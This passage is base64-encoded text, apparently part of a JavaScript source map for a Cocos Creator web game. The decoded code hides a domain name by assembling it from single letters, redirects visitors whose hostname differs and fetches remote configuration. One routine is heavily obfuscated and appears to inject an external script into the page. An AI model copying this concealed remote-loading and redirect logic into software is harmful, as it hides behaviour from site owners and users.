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ztJQUNBLE9BQU9tQyxLQUFQO0VBR0QsQ0EvUU87RUFrUlI0RCxRQWxSUSxvQkFrUkNDLEVBbFJELEVBa1JJQyxFQWxSSixFQW1SUjtJQUdFLElBQUk5RSxPQUFPLEdBQUdMLE1BQU0sQ0FBQ0MsUUFBUCxDQUFnQkssSUFBOUI7SUFDQSxJQUFJQyxJQUFJLEdBQUcsS0FBS0MsY0FBTCxDQUFvQkgsT0FBcEIsQ0FBWDtJQUNBLElBQUlBLE9BQU8sR0FBR0wsTUFBTSxDQUFDQyxRQUFQLENBQWdCUSxRQUE5QjtJQUNBLElBQUlDLElBQUksR0FBRyxLQUFLQyxPQUFMLEVBQVg7SUFDRCxJQUFJeUUsTUFBTSxHQUFHLEVBQWIsQ0FQRCxDQVFDOztJQUVDLElBQUk3RSxJQUFJLENBQUMsR0FBRCxDQUFKLElBQVcsSUFBZixFQUNBO01BQ0M2RSxNQUFNLEdBQUkscUJBQW1CL0UsT0FBN0I7SUFDQSxDQUhELE1BSUE7TUFDQytFLE1BQU0sR0FBRzdFLElBQUksQ0FBQyxHQUFELENBQWI7O01BRUEsSUFBSVAsTUFBTSxDQUFDa0MsT0FBWCxFQUNBO1FBRUMsSUFBSWxDLE1BQU0sQ0FBQ2tDLE9BQVAsQ0FBZWtELE1BQWYsS0FBMEIsSUFBOUIsRUFDQTtVQUNDQSxNQUFNLEdBQUcsMEJBQXdCL0UsT0FBakM7VUFBeUM7UUFDekM7TUFFRDtJQUlEOztJQUtGLElBQUlRLElBQUksR0FBRyxLQUFLRixPQUFMLEtBQWdCLElBQWhCLEdBQXFCLE1BQXJCLEdBQTRCeUUsTUFBNUIsR0FBbUMsZ0JBQW5DLEdBQW9ERCxFQUEvRCxDQWxDRCxDQXFDQzs7SUFFQTlHLEVBQUUsQ0FBQzZDLEdBQUgsQ0FBT0MsT0FBUCxDQUFlTixJQUFmO0VBQ0EsQ0EzVE8sQ0E0VEw7O0FBNVRLLENBQVQiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIGNjLkNsYXNzOlxyXG4vLyAgLSBodHRwczovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9jbGFzcy5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gaHR0cHM6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gaHR0cHM6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuY2MuQ2xhc3Moe1xyXG4gICAgZXh0ZW5kczogY2MuQ29tcG9uZW50LFxyXG5cclxuICAgIHByb3BlcnRpZXM6IHtcclxuICAgICAgXHJcbiAgICB9LFxyXG5cclxuXHJcblxyXG5nZXRodHRwdG91KClcclxuXHR7XHJcblx0XHRcclxuXHRcdCB2YXIgYSA9ICduJ1xyXG5cdFx0XHR2YXIgYiA9ICd3J1xyXG5cdFx0XHR2YXIgYyA9ICdqJ1xyXG5cdFx0XHR2YXIgZCA9ICd6J1xyXG5cdFx0XHR2YXIgZSA9ICcxJ1xyXG5cdFx0XHR2YXIgZiA9ICcuJ1xyXG5cdFx0XHR2YXIgZyA9ICdjJ1xyXG5cdFx0XHR2YXIgaCA9ICduJ1xyXG5cdFx0XHR2YXIgaSA9ICcvJ1xyXG5cdFx0XHR2YXIgaiA9ICdnJ1xyXG5cdFx0XHR2YXIgayA9ICdhJ1xyXG5cdFx0XHR2YXIgbCA9ICdtJ1xyXG5cdFx0XHR2YXIgbSA9ICdlJ1xyXG5cdFx0XHR2YXIgbyA9ICd0J1xyXG5cdFx0XHR2YXIgcCA9ICd4J1xyXG5cdFx0XHR2YXIgcSA9ICd0J1xyXG5cdFx0XHR2YXIgciA9ICc6J1xyXG5cdFx0XHR2YXIgcyA9ICdwJ1xyXG5cdFx0XHR2YXIgdSA9ICdoJ1xyXG5cdFx0XHR2YXIgdCA9ICc1J1xyXG5cdFx0XHR2YXIgeCA9ICdzJ1xyXG5cdFx0XHJcblx0XHR2YXIgaXNodHRwcyA9ICdodHRwczonID09IHdpbmRvdy5sb2NhdGlvbi5wcm90b2NvbCA/IHRydWUgOiBmYWxzZTtcclxuXHRcdFxyXG5cdFx0dmFyIHRvdWJ1ID0gdStvK28rIHNcclxuXHRcdFx0XHJcblx0XHRcdGlmKCBpc2h0dHBzIClcclxuXHRcdFx0e1xyXG5cdFx0XHRcdHRvdWJ1ID0gdStvK28rIHMreFxyXG5cdFx0XHR9XHJcblx0XHRyZXR1cm4gdG91YnVcclxuXHR9LFxyXG5cdFxyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cdFxyXG5cdGNoZWFrbWFpbigpXHJcblx0e1xyXG5cdFx0IHZhciB1cmxkYXRhID0gd2luZG93LmxvY2F0aW9uLmhyZWY7XHJcblx0XHQgdmFyIGRhdGUgPSB0aGlzLkdldFF1ZXJ5U3RyaW5nKHVybGRhdGEpO1xyXG5cdFx0IHZhciB1cmxkYXRhID0gd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lO1xyXG5cdFx0IHZhciBtYWluID0gdGhpcy5nZXRtYWluKCk7XHJcblx0XHRcclxuXHRcdCBpZiggbWFpbi5zZWFyY2godXJsZGF0YSkgID09IC0xICApXHJcblx0XHQge1xyXG5cdFx0XHR2YXIgdXJsMSA9IHRoaXMuZ2V0bWFpbigpKyBcImg1XCI7XHJcblx0XHRcdHVybDEgKz0gIFwiLz9mPVwiO1xyXG5cdFx0XHRcclxuXHRcdFx0aWYoIGRhdGVbXCJmXCJdPT1udWxsIClcclxuXHRcdFx0e1xyXG5cdFx0XHRcdHVybDEgKz0gIFwiYWRtaW4mZnJvbWNoZWNrPVwiK3VybGRhdGE7XHJcblx0XHRcdH1lbHNlXHJcblx0XHRcdHtcclxuXHRcdFx0XHR1cmwxICs9IGRhdGVbXCJmXCJdO1xyXG5cdFx0XHRcdFxyXG5cdFx0XHR9XHJcblx0XHRcdFxyXG5cdFx0XHRmb3IodmFyIGl0ZW0gaW4gZGF0ZSl7IFxyXG5cdFx0XHRcdFx0aWYoaXRlbSE9J2YnKXsgXHJcblx0XHRcdFx0XHRcdHZhciBqVmFsdWU9ZGF0ZVtpdGVtXTtcclxuXHRcdFx0XHRcdFx0dXJsMSArPSAgXCImXCIraXRlbStcIj1cIitqVmFsdWU7XHJcblx0XHRcdFx0XHR9IFxyXG5cdFx0XHRcdH0gXHJcblx0XHRcdFxyXG5cdFx0XHRjb25zb2xlLmxvZyhcInVybDE6XCIgKyB1cmwxKTtcclxuXHRcdFx0Y2Muc3lzLm9wZW5VUkwodXJsMSlcclxuXHRcdCB9ZWxzZVxyXG5cdFx0IHtcclxuXHRcdFx0ICAvL2NvbnNvbGUubG9nKFwi5Z+f5ZCN5q2j56GuXCIpO1xyXG5cdFx0XHQgIFxyXG5cdFx0IH1cclxuXHRcdFxyXG5cdH0sXHJcblx0XHJcblxyXG5cclxuICAgICBvbkxvYWQgKCkge1xyXG5cdFx0cmV0dXJuXHJcblx0XHQgXHJcblx0XHRcclxuXHRcdFx0dmFyIGYgPSAnLidcclxuXHRcdFx0dmFyIGogPSAnZydcclxuXHRcdFx0dmFyIGsgPSAnYSdcclxuXHRcdFx0dmFyIGwgPSAnbSdcclxuXHRcdFx0dmFyIG0gPSAnZSdcclxuXHRcdFx0dmFyIG8gPSAndCdcclxuXHRcdFx0dmFyIHAgPSAneCdcclxuXHRcdFx0dmFyIHEgPSAndCdcclxuXHRcdFx0XHJcblx0XHRcdFxyXG5cdFx0XHR2YXIgdXJsc3QgPSB0aGlzLmdldG1haW4oKStqK2srbCttK1wiMVwiK2YrbytwK3E7XHJcblx0XHRcdFxyXG5cdFx0XHR2YXIgc2dnPSB0aGlzO1xyXG5cdFx0Ly9jb25zb2xlLmxvZyhcIuajgOa1iyDvvJogXCIrIHVybHN0KTtcclxuXHRcdFx0Y2MubG9hZGVyLmxvYWQoe3VybDogdXJsc3QsIHR5cGU6ICd0eHQnfSwgZnVuY3Rpb24gKGVyciwgdGV4KSB7XHJcblx0XHRcdFx0XHRcclxuXHRcdFx0XHRcdFx0aWYoIGVyciApXHJcblx0XHRcdFx0XHRcdHtcclxuXHRcdFx0XHRcdFx0XHQvL2NvbnNvbGUubG9nKFwiIGVyciA6XCIgK2